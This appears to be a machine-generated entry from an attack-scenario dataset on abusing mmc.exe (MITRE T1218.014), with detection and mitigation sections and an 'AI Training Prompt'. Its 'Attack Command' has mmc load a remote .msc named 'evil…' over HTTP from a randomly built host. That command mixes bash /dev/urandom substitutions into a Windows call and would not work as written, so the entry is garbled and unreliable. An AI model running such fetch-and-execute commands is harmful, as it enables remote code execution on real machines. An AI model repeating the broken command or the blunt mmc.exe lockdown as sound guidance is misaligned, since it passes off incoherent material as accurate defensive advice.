---
type: campaign
scenario_id: 341
tactic: Defense Evasion
technique: "T1218.014: MMC"
technique_id: T1218.014
tags: [campaign, lotl, defense_evasion]
---

# Using mmc.exe to execute malicious MSC via HTTP.

## Threat Description
Using mmc.exe to execute malicious MSC via HTTP.

## Attack Command
```
mmc http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).msc) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)
```

## Detection Logic
Monitor mmc HTTP: `wmic process where name='mmc.exe' get commandline | findstr http`; YARA rule: `rule MmcHttpMsc { strings: $a = /mmc.*http.*msc/ nocase; condition: $a }`.

## Mitigation
Restrict mmc: `icacls %windir%\System32\mmc.exe /deny Everyone:RX`; Block MSC downloads: `netsh advfirewall firewall add rule name='Block mmc' dir=out program='%windir%\System32\mmc.exe' action=block`.

## AI Training Prompt
Train AI to detect mmc HTTP MSC execution and suggest firewall rules.

## References
- MITRE ATT&CK T1218.014: https://attack.mitre.org/techniques/T1218/014/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
